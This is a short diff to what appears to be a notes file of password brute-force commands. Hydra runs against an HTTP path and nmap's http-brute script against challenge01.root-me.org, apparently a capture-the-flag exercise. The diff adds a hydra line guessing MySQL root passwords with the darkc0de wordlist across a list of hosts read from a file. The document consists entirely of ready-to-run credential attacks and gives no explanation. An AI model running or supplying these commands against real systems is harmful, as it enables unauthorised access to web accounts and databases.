@@ -1,3 +1,5 @@
 hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ 
 
+usr/local/bin/hydra -s 3306 -V -d -l root -P /pentest/passwords/wordlists/darkc0de.lst -e ns -t 10 -w 60 -M /root/Desktop/ip.txt mysql
+
 nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
